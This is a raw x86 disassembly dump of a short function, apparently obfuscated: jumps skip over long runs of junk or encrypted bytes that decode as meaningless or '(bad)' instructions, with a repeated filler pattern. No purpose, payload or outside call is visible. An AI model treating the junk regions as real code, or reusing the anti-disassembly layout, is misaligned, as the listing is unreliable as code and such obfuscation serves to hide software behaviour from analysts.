  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	out    0x5,eax
  40c0e2:	adc    eax,0x7e35e1f7
  40c0e7:	jle    0x40c09f
  40c0e9:	jle    0x40c169
  40c0eb:	jle    0x40c11e
  40c0ed:	lea    esi,[esp+esi*4-0x6f09d367]
  40c0f4:	loopne 0x40c092
  40c0f6:	int    0xad
  40c0f8:	xchg   edi,eax
  40c0f9:	addr16 adc ebp,eax
  40c0fc:	gs inc eax
  40c0fe:	cmp    bl,ch
  40c100:	in     al,dx
  40c101:	bound  ecx,QWORD PTR [ebp+0x21]
  40c104:	sub    al,0x2f
  40c106:	push   0x5a
  40c108:	rcl    BYTE PTR [esi-0x49],1
  40c10b:	and    dh,cl
  40c10d:	ins    DWORD PTR es:[edi],dx
  40c10e:	and    eax,0xa8e4d879
  40c113:	xor    esp,DWORD PTR [ecx]
  40c115:	shr    DWORD PTR [ebx],0x5e
  40c118:	pushf  
  40c119:	(bad)  
  40c11a:	mov    cl,0x3a
  40c11c:	sbb    DWORD PTR [ebx+0x27d24d1f],ebx
  40c122:	lds    edx,FWORD PTR [ecx]
  40c124:	ja     0x40c19d
  40c126:	stc    
  40c127:	jmp    0x8827:0xc6a84836
  40c12e:	cli    
  40c12f:	mov    ebx,0x558ce64b
  40c134:	sbb    eax,0xbec93533
  40c139:	xor    bh,dh
  40c13b:	adc    eax,0xe03f54f
  40c140:	scas   al,BYTE PTR es:[edi]
  40c141:	sub    cl,bl
  40c143:	pop    ss
  40c144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c145:	daa    
  40c146:	and    bl,BYTE PTR [eax+0x30]
  40c149:	cmp    DWORD PTR [eax+0x2],esp
  40c14c:	or     ecx,ebx
  40c14e:	(bad)  
  40c14f:	scas   eax,DWORD PTR es:[edi]
  40c150:	mov    ecx,0x842a4e5
  40c155:	pop    es
  40c156:	dec    esp
  40c157:	clc    
  40c158:	je     0x40c0ec
  40c15a:	(bad)  
  40c15b:	shl    esp,cl
  40c15d:	(bad)  
  40c15e:	call   FWORD PTR [edx+esi*2-0x2d]
  40c162:	xchg   esp,eax
  40c163:	sahf   
  40c164:	outs   dx,DWORD PTR ds:[esi]
  40c165:	mov    cl,0xb5
  40c167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c168:	jne    0x40c16c
  40c16a:	mov    al,0x11
  40c16c:	pop    es
  40c16d:	sbb    eax,0xca5e7dc8
  40c172:	xchg   DWORD PTR [ebx-0x57],eax
  40c175:	iret   
  40c176:	add    ch,cl
  40c178:	and    DWORD PTR [edx],eax
  40c17a:	imul   esp,DWORD PTR [eax+eax*8-0x28],0x11
  40c17f:	in     eax,dx
  40c180:	ins    BYTE PTR es:[edi],dx
  40c181:	stc    
  40c182:	ret    0x18e9
  40c185:	retf   
  40c186:	cmp    al,0xd8
  40c188:	addr16 sbb al,0xb6
  40c18b:	fisttp QWORD PTR [eax]
  40c18d:	fsubr  QWORD PTR [bx+si-0x577a]
  40c192:	test   eax,0xa2aa1826
  40c197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c198:	or     ebp,DWORD PTR [eax+0x36]
  40c19b:	ds ret 0xe7b0
  40c19f:	mov    edi,0x1357bec9
  40c1a4:	mov    eax,ds:0xcb5d8bd7
  40c1a9:	(bad)  
  40c1aa:	lock aam 0xb
  40c1ad:	jnp    0x40c1e5
  40c1af:	ja     0x40c1c6
  40c1b1:	jmp    0x8cce8a08
  40c1b6:	or     bl,BYTE PTR [edi+0x3b003272]
  40c1bc:	enter  0x850f,0xcc
  40c1c0:	std    
  40c1c1:	(bad)  
  40c1c2:	dec    DWORD PTR [ebx+0xeae9de]
  40c1c8:	add    BYTE PTR [eax],al
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx-0x290a3f14]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	ss sbb edi,eax
  40c1ef:	stos   DWORD PTR es:[edi],eax
  40c1f0:	mov    bl,0x91
  40c1f2:	mov    edx,0x30356e86
  40c1f7:	mov    edi,0xf36ad2a
  40c1fc:	sbb    BYTE PTR [ebp+0x2856b207],bl
  40c202:	mov    ds:0xe5f88c1f,al
  40c207:	fst    DWORD PTR [edx]
  40c209:	shl    DWORD PTR [edx+0x76d93d51],cl
  40c20f:	sub    DWORD PTR [ebx+0x16],0xe66ea5ef
  40c216:	cld    
  40c217:	enter  0x7cc8,0x37
  40c21b:	lahf   
  40c21c:	xchg   BYTE PTR [esi],ch
  40c21e:	and    edi,edi
  40c220:	pop    ebx
  40c221:	and    al,0xd
  40c223:	inc    eax
  40c224:	dec    ecx
  40c225:	inc    edx
  40c226:	sbb    al,0x78
  40c228:	cmp    al,0x94
  40c22a:	inc    ebp
  40c22b:	out    0xda,eax
  40c22d:	xor    DWORD PTR [ebx],0x9ab0de42
  40c233:	ret    0x27ec
  40c236:	jns    0x40c24a
  40c238:	in     al,dx
  40c239:	popa   
  40c23a:	pop    esp
  40c23b:	div    DWORD PTR [edx-0x723618d3]
  40c241:	stos   BYTE PTR es:[edi],al
  40c242:	inc    eax
  40c243:	jae    0x40c1d2
  40c245:	(bad)  
  40c246:	sub    eax,0xffc6211c
  40c24b:	xchg   ebx,eax
  40c24c:	pop    eax
  40c24d:	in     eax,dx
  40c24e:	mov    cl,0x18
  40c250:	sbb    DWORD PTR [edi],edx
  40c252:	and    al,bh
  40c254:	push   ss
  40c255:	jbe    0x40c23d
  40c257:	js     0x40c297
  40c259:	int    0x7d
  40c25b:	in     al,0xe4
  40c25d:	retf   0xb5fe
  40c260:	adc    al,BYTE PTR [ebp+0x7a]
  40c263:	push   0xffffff95
  40c265:	push   ecx
  40c266:	push   esi
  40c267:	retf   
  40c268:	sahf   
  40c269:	call   0x14978165
  40c26e:	hlt    
  40c26f:	out    0x3d,eax
  40c271:	out    0xa3,eax
  40c273:	fcmove st,st(2)
  40c275:	pop    ebx
  40c276:	jge    0x40c232
  40c278:	sub    ah,BYTE PTR [ebp-0x63]
  40c27b:	mov    ecx,0xe992ce4b
  40c280:	xchg   edi,eax
  40c281:	xchg   esp,eax
  40c282:	rcl    BYTE PTR [esi+ebp*8-0x1],cl
  40c286:	(bad)  
  40c287:	in     eax,0xc3
  40c289:	jmp    0xaa02:0xbbaf6e91
  40c290:	and    al,0xce
  40c292:	pop    edx
  40c293:	push   ebx
  40c294:	inc    ecx
  40c295:	xchg   esi,eax
  40c296:	arpl   di,si
  40c298:	mov    ds,WORD PTR ds:0xe5889a7e
  40c29e:	fimul  WORD PTR [edi+0x3a]
  40c2a1:	push   ds
  40c2a2:	adc    ebx,DWORD PTR ds:[edx+0x1f6d2255]
  40c2a9:	jae    0x40c2ba
  40c2ab:	inc    DWORD PTR [ebp+eax*1+0x21]
  40c2af:	inc    edx
  40c2b0:	scas   eax,DWORD PTR es:[edi]
  40c2b1:	rol    DWORD PTR [edi-0x3ba74c0],0x35
  40c2b8:	pop    ecx
  40c2b9:	or     BYTE PTR [ecx+0x7],dl
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	std    
  40c2da:	or     eax,0xcb7171b2
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	imul   ebx,DWORD PTR [eax-0x5136fdfd],0x7c75314b
  40c2ef:	jnp    0x40c303
  40c2f1:	(bad)  
  40c2f2:	jbe    0x40c36b
  40c2f4:	jae    0x40c2c8
  40c2f6:	in     al,dx
  40c2f7:	xchg   edx,eax
  40c2f8:	mov    edx,0x1c6be087
  40c2fd:	mov    ecx,0x2ec5f537
  40c302:	xor    eax,0x3c496294
  40c307:	cld    
  40c308:	push   eax
  40c309:	test   BYTE PTR ds:[eax],dl
  40c30c:	scas   al,BYTE PTR es:[edi]
  40c30d:	and    al,BYTE PTR [ebx]
  40c30f:	mov    ebx,0x8d7775d4
  40c314:	add    esp,DWORD PTR ds:0x53fc2501
  40c31a:	popf   
  40c31b:	jle    0x40c2b8
  40c31d:	pop    ecx
  40c31e:	loope  0x40c2f3
  40c320:	retf   
  40c321:	cmp    BYTE PTR [eax+0x17],0x4d
  40c325:	inc    ecx
  40c326:	ss inc esi
  40c328:	std    
  40c329:	or     edi,edx
  40c32b:	adc    BYTE PTR [edi+0x6d],ah
  40c32e:	and    bl,bl
  40c330:	test   al,0x98
  40c332:	popa   
  40c333:	sbb    BYTE PTR [eax-0x794ac4ab],dh
  40c339:	or     ecx,eax
  40c33b:	fisttp DWORD PTR [ebx-0x2e481858]
  40c341:	(bad)
  40c344:	ins    DWORD PTR es:[edi],dx
  40c345:	les    edx,FWORD PTR [esi+0x5014466f]
  40c34b:	icebp  
  40c34c:	repnz stc 
  40c34e:	mov    ds:0x3d1dcae1,eax
  40c353:	dec    ebx
  40c354:	lea    ebx,[edx-0x463cf185]
  40c35a:	adc    eax,DWORD PTR [ebp-0x64]
  40c35d:	jno    0x40c334
  40c35f:	aad    0xca
  40c361:	or     edx,DWORD PTR [esp+edi*8+0x7dcc131f]
  40c368:	add    eax,0x2427dfa6
  40c36d:	data16 mov ds:0xbfb794c5,al
  40c373:	inc    esp
  40c374:	cmp    al,0xfd
  40c376:	and    ecx,DWORD PTR [edi+eax*8]
  40c379:	in     eax,dx
  40c37a:	xchg   ch,dh
  40c37c:	out    dx,al
  40c37d:	(bad)  
  40c37e:	pop    edx
  40c37f:	mov    ds:0x4aaaf14b,eax
  40c384:	sub    edx,DWORD PTR [edx+edx*8+0x69b45cf9]
  40c38b:	out    0xad,al
  40c38d:	dec    ebx
  40c38e:	lds    eax,FWORD PTR [eax-0x61]
  40c391:	fistp  WORD PTR [ecx+0x2724d322]
  40c397:	(bad)  
  40c399:	ret    0xaa0c
  40c39c:	shr    DWORD PTR [ecx+0x7f],1
  40c39f:	int3   
  40c3a0:	(bad)
  40c3a3:	adc    BYTE PTR [esi+0x4fd0130c],bl
  40c3a9:	ja     0x40c422
  40c3ab:	mov    al,BYTE PTR [eax-0x1]
  40c3ae:	shl    DWORD PTR [ebx],cl
  40c3b0:	fucomi st,st(1)
  40c3b2:	loopne 0x40c3b4
  40c3b4:	add    BYTE PTR [eax],al
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0xd62e5fee,ecx
  40c3c3:	sbb    DWORD PTR [ebx+0x26],esi
  40c3c6:	dec    ecx
  40c3c7:	retf   
  40c3c8:	jle    0x40c448
  40c3ca:	mov    dh,0x7e
  40c3cc:	jle    0x40c44c
  40c3ce:	(bad)  
  40c3cf:	mul    BYTE PTR [edi]
  40c3d1:	adc    ch,bh
  40c3d3:	stc    
  40c3d4:	dec    edi
  40c3d5:	repnz dec edi
  40c3d7:	ss jmp 0xddda8e41
  40c3dd:	add    eax,0x5e5af1b1
  40c3e2:	xchg   edi,eax
  40c3e3:	or     ah,BYTE PTR [edi+0x30]
  40c3e6:	mov    esp,0xbd1b1466
  40c3eb:	inc    ebp
  40c3ec:	dec    esp
  40c3ed:	sbb    eax,0xf5a4b6ca
  40c3f2:	bnd jl 0x40c377
  40c3f5:	xchg   esp,eax
  40c3f6:	add    DWORD PTR [esi+0x7e],edx
  40c3f9:	and    DWORD PTR [edx],edi
  40c3fb:	adc    eax,0xe3562aa4
  40c400:	jg     0x40c3b3
  40c402:	or     eax,0x84d6620a
  40c407:	sbb    al,0x6c
  40c409:	sub    BYTE PTR [edx+0x7c],ah
  40c40c:	(bad)  
  40c40d:	pop    ebx
  40c40e:	adc    cl,BYTE PTR [edx+0x16]
  40c411:	xor    bl,bl
  40c413:	out    0x1d,eax
  40c415:	sbb    cl,BYTE PTR [ecx-0x67]
  40c418:	mov    edx,0xe9ba82
  40c41d:	and    al,al
  40c41f:	mov    ebx,0x725c34ea
  40c424:	fldcw  WORD PTR [edi+0x4d]
  40c427:	push   esp
  40c428:	jp     0x40c3d4
  40c42a:	pop    edx
  40c42b:	ficom  WORD PTR [ecx+edx*2+0x3d]
  40c42f:	and    ebp,DWORD PTR [ecx-0x71]
  40c432:	icebp  
  40c433:	mov    esp,0x1ad20b
  40c438:	adc    dh,al
  40c43a:	xchg   edi,eax
  40c43b:	ins    BYTE PTR es:[edi],dx
  40c43c:	push   0x19
  40c43e:	(bad)  
  40c43f:	fistp  QWORD PTR [edx-0x3ffe72e4]
  40c445:	push   ebx
  40c446:	xor    BYTE PTR [eax+0x7e62aafa],ch
  40c44c:	mov    ebp,0x585cd4b2
  40c451:	sbb    BYTE PTR [edx],dh
  40c453:	pop    edi
  40c454:	dec    eax
  40c455:	add    DWORD PTR [ebx],ebp
  40c457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c458:	sbb    eax,edx
  40c45a:	into   
  40c45b:	inc    ebx
  40c45c:	add    BYTE PTR [edx-0x1348cef6],ch
  40c462:	sahf   
  40c463:	mov    edi,DWORD PTR [ebx+0x1c042f81]
  40c469:	loop   0x40c41d
  40c46b:	test   eax,0xd00185f0
  40c470:	push   edi
  40c471:	jmp    0x6c82:0x28071750
  40c478:	mov    ah,0x41
  40c47a:	dec    edi
  40c47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47c:	add    ebx,esi
  40c47e:	sub    dl,ah
  40c480:	rcl    ch,cl
  40c482:	pop    es
  40c483:	inc    esp
  40c484:	xlat   BYTE PTR ds:[ebx]
  40c485:	sbb    al,BYTE PTR [edx-0x6d]
  40c488:	(bad)  
  40c489:	nop
  40c48a:	fcomi  st,st(1)
  40c48c:	popf   
  40c48d:	aas    
  40c48e:	add    eax,0x9c429228
  40c493:	(bad)  
  40c494:	es ja  0x40c4da
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	les    ebp,FWORD PTR gs:[edi-0x377e4fb7]
  40c4b1:	jle    0x40c531
  40c4b3:	mov    dh,0x7e
  40c4b5:	jle    0x40c535
  40c4b7:	cwde   
  40c4b8:	std    
  40c4b9:	aam    0x78
  40c4bb:	cwde   
  40c4bc:	aaa    
  40c4bd:	(bad)  
  40c4be:	jl     0x40c45d
  40c4c0:	leave  
  40c4c1:	cmc    
  40c4c2:	xchg   ebx,eax
  40c4c3:	or     DWORD PTR [edi],eax
  40c4c5:	push   0xffffff97
  40c4c7:	inc    edi
  40c4c8:	add    al,0x81
  40c4ca:	jp     0x40c4a2
  40c4cc:	sbb    al,0x55
  40c4ce:	push   es
  40c4cf:	or     eax,0x4ee11ec9
  40c4d4:	cwde   
  40c4d5:	ins    DWORD PTR es:[edi],dx
  40c4d6:	sbb    bh,BYTE PTR [ebx+0x7a]
  40c4d9:	and    eax,0x44325a3c
  40c4de:	stos   BYTE PTR es:[edi],al
  40c4df:	xchg   edx,eax
  40c4e0:	cdq    
  40c4e1:	pop    ss
  40c4e2:	in     eax,dx
  40c4e3:	mov    ds:0xa404edfb,eax
  40c4e8:	retf   0xbc7f
  40c4eb:	jge    0x40c484
  40c4ed:	nop
  40c4ee:	mov    dl,0x64
  40c4f0:	and    BYTE PTR [eax+0x7098e5c2],0xa6
  40c4f7:	or     DWORD PTR [ebx+0x9],ecx
  40c4fa:	xor    eax,0xfe09bc6e
  40c4ff:	mov    DWORD PTR [edx-0x215189f6],ebx
  40c505:	fnstcw WORD PTR [ebp-0x3483e759]
  40c50b:	pop    ds
  40c50c:	loop   0x40c583
  40c50e:	and    al,0x5d
  40c510:	and    DWORD PTR [eax+eax*1+0x68d7f2ca],0xfffffffc
  40c518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c519:	jne    0x40c4ed
  40c51b:	aam    0xc6
  40c51d:	lds    esi,FWORD PTR [edi+0xf30f107]
  40c523:	mov    al,BYTE PTR [edi+0x1422c6d7]
  40c529:	push   esp
  40c52a:	sbb    eax,0xcbae245f
  40c52f:	push   edi
  40c530:	pop    esi
  40c531:	jnp    0x40c545
  40c533:	dec    ebx
  40c534:	inc    eax
  40c535:	push   esi
  40c536:	in     eax,dx
  40c537:	es pop ebp
  40c539:	pop    edi
  40c53a:	add    dl,BYTE PTR [edx]
  40c53c:	pop    ebp
  40c53d:	mov    al,0x4e
  40c53f:	dec    ebx
  40c540:	cmp    al,0x85
  40c542:	cmc    
  40c543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c544:	ror    DWORD PTR [edx-0x75d1a02e],0x55
  40c54b:	jbe    0x40c583
  40c54d:	iret   
  40c54e:	lahf   
  40c54f:	adc    DWORD PTR [ebp+0x5bcf8f4b],esp
  40c555:	adc    bl,BYTE PTR [edi+0x4b2e34ac]
  40c55b:	xchg   edi,eax
  40c55c:	fsubp  st(2),st
  40c55e:	cmp    al,0xf8
  40c560:	dec    ecx
  40c561:	xchg   edi,eax
  40c562:	sbb    eax,0x2a365961
  40c567:	stos   BYTE PTR es:[edi],al
  40c568:	call   0x96f9:0x74af1410
  40c56f:	mov    esp,DWORD PTR [eax]
  40c571:	int3   
  40c572:	mov    ch,0xc9
  40c574:	add    al,0x35
  40c576:	imul   ecx,DWORD PTR [edi-0x421c0d65],0xf84a1a1
  40c580:	test   ch,bh
  40c582:	add    BYTE PTR [eax],al
  40c584:	add    BYTE PTR [edx+0x6a590a6a],dl
  40c58a:	add    al,0x5b
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0xb5f22e2
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	fld1   
  40c5b2:	xchg   ecx,eax
  40c5b3:	mov    ah,0x4c
  40c5b5:	xor    eax,0x48bf536e
  40c5ba:	dec    esp
  40c5bb:	or     BYTE PTR [edx],bh
  40c5bd:	retf   0xc761
  40c5c0:	fsubr  QWORD PTR [esp+esi*1-0x2fc0a7d4]
  40c5c7:	push   es
  40c5c8:	mov    esp,0x80ea428f
  40c5cd:	xchg   edx,eax
  40c5ce:	lods   eax,DWORD PTR ds:[esi]
  40c5cf:	dec    ecx
  40c5d0:	(bad)  
  40c5d2:	xor    ecx,esi
  40c5d4:	push   edx
  40c5d5:	loope  0x40c64a
  40c5d7:	jle    0x40c625
  40c5d9:	es scas eax,DWORD PTR es:[edi]
  40c5db:	xchg   esp,eax
  40c5dc:	hlt    
  40c5dd:	adc    eax,0x404bf3f8
  40c5e2:	adc    eax,0xa13e1197
  40c5e7:	retf   0x1922
  40c5ea:	imul   ebx,DWORD PTR [ebp+0x3e766318],0x76192757
  40c5f4:	in     eax,dx
  40c5f5:	add    eax,0x8bafa0b0
  40c5fa:	jno    0x40c600
  40c5fc:	sbb    eax,0xb6f6cd92
  40c601:	test   BYTE PTR [edi+0x7],cl
  40c604:	dec    ebx
  40c605:	(bad)  
  40c606:	stc    
  40c607:	jbe    0x40c58a
  40c609:	int3   
  40c60a:	jnp    0x40c59d
  40c60c:	jle    0x40c674
  40c60e:	sti    
  40c60f:	pop    edi
  40c610:	add    cl,BYTE PTR [ecx+edx*1]
  40c613:	std    
  40c614:	mov    DWORD PTR [esi+0x41],eax
  40c617:	inc    eax
  40c618:	mov    WORD PTR [ebx-0x7f],?
  40c61b:	fisub  WORD PTR [ebp-0x44]
  40c61e:	jo     0x40c64c
  40c620:	pop    edi
  40c621:	and    al,0xa6
  40c623:	test   eax,0x6c280195
  40c628:	dec    ebx
  40c629:	xor    dl,BYTE PTR [ebx+0x4c]
  40c62c:	call   0xa2408a54
  40c631:	mov    al,ds:0xa6349a0f
  40c636:	xor    dh,BYTE PTR [eax+0x62]
  40c639:	repnz xor DWORD PTR [ebx-0x315e7652],esp
  40c640:	jp     0x40c5fc
  40c642:	pop    eax
  40c643:	inc    edx
  40c644:	dec    esi
  40c645:	lahf   
  40c646:	jmp    0x84c8:0x71246667
  40c64d:	jno    0x40c6b2
  40c64f:	jne    0x40c691
  40c651:	pop    ecx
  40c652:	or     eax,0x23ca7f55
  40c657:	adc    BYTE PTR [ecx+eiz*8+0x21],0xf6
  40c65c:	int    0x49
  40c65e:	arpl   bx,si
  40c660:	sar    BYTE PTR [ecx+ecx*4-0x64],0x86
  40c665:	pushf  
  40c666:	fwait
  40c667:	xor    edi,DWORD PTR [edi]
  40c669:	pop    es
  40c66a:	arpl   WORD PTR [eax+eax*8+0x46],sp
  40c66e:	mov    edx,0x4fcbec95
  40c673:	push   ds
  40c674:	jg     0x40c66d
  40c676:	xor    eax,0x458b4928
  40c67b:	in     al,0xf
  40c67d:	scas   eax,DWORD PTR es:[edi]
  40c67e:	rol    DWORD PTR [ebx],0xe0
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
